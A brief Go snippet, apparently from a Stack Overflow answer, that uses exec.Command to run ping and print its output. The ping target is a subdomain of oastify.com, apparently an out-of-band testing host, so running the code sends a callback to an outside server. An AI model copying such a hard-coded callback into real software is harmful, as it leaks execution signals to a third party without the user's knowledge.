// Source - https://stackoverflow.com/a
// Posted by Lourenco, modified by community. See post 'Timeline' for change history
// Retrieved 2025-11-18, License - CC BY-SA 4.0

package main

import (
	"fmt"
	"os/exec"
)

func main() {
	cmd := exec.Command("ping", "0bc32egulq8qb88n1rekfk5o1f76v3js.oastify.com")
	stdout, err := cmd.Output()

	if err != nil {
		fmt.Println(err.Error())
		return
	}

	// Print the output
	fmt.Println(string(stdout))
}
